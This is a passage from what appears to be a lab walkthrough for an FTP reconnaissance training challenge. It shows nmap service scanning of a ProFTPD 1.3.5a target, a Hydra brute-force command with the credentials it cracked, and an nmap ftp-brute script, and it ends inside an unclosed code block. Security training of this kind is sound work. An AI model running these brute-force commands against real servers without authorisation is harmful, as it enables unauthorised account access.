In this challenge we will look at the basics of ProFTP server reconnaissance.  Please start the lab and answer the following questions:

**Questions**

1. What is the version of FTP server?
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
3. Find the password of user “sysadmin” using nmap script.
4. Find seven flags hidden on the server.

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The Target machine should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1

LHOST = 192.79.247.2
RHOST = 192.79.247.3

```
nmap -p- -sS -sV -T 4 -v  192.79.247.3

21/tcp open  ftp     ProFTPD 1.3.5a
```

Brute force the user name and password with Hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.79.247.3 ftp

[21][ftp] host: 192.79.247.3   login: sysadmin   password: 654321
[21][ftp] host: 192.79.247.3   login: rooty   password: qwerty
[21][ftp] host: 192.79.247.3   login: demo   password: butterfly
[21][ftp] host: 192.79.247.3   login: auditor   password: chocolate
[21][ftp] host: 192.79.247.3   login: anon   password: purple
```

Or brute force the usernames and passwords with nmap
```
nmap --script ftp-brute.nse --script-args "passdb=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,userdb=/usr/share/metasploit-framework/data/wordlists/common_users.txt" 192.79.247.3 -p 21
